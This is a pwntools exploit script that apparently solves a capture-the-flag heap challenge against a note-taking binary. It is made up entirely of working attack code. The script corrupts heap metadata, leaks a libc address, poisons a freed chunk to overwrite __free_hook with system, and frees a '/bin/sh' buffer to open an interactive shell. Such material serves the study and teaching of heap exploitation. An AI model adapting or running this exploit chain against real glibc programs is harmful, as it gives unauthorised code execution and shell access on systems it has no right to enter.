# -- coding: utf-8 --
from pwn import *

# ENV
PORT = 0000
HOST = "host"
e = context.binary = ELF('./chall')
# lib = ELF('')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = process("./chall") 
pause()


# VARIABLE
def create(size):
    r.sendlineafter(">>", "1")
    r.sendlineafter("Size", str(size))

def delete():
    r.sendlineafter(">>", "4")

def edit(data):
    r.sendlineafter(">>", "3")
    r.sendline(data)

def show():
    r.sendlineafter(">>", "2")
    r.recvuntil(b'NOTE 1 ------------>\n')
    return r.recvuntil("<-------------------------------->\n", drop=True)

# PAYLOAD

create(0x7f)
edit("\x00" * 0xD4 + p64(0x20) + p64(0xffffffff))
delete()
# edit max_size to 0xffffffff

create(0x200)
delete()
create(0x210)
delete()
create(30)  # prevent consolidation
delete()
# create unsorted bin chunk

create(0x200)
edit("\x00"*0xf4 + p32(0x531))
delete()
create(0x7f)
edit("\x00" * 0xD4 + p64(0x20) + p64(0xffffffff) + p64(0)*2 + p64(0x111) + p32(0x130-20))
leak = show()
leak = u64(leak[268:276])
info('LEAK: 0x%x' % leak)
lib.address = leak - 0x1ebbe0
info("libc base: 0x%x" % lib.address)
one = [0xe6e73, 0xe6e76, 0xe6e79]
lib.sym["win"] = lib.address + one[0]
info("one: 0x%x" % lib.sym["win"])
# leak libc address 
delete()

create(0x3f8)
delete()

create(127)
edit("a" * 128 + 'b' * 68 + p64(lib.sym.__free_hook - 8))
delete()
create(0x3f8)
edit("a" * 4 + p64(lib.sym.system))
# overwrite __free_hook with system

create(127)
edit("\0"*0xfc + '/bin/sh\x00')
delete()
# call __free_hook => system("/bin/sh")

r.interactive()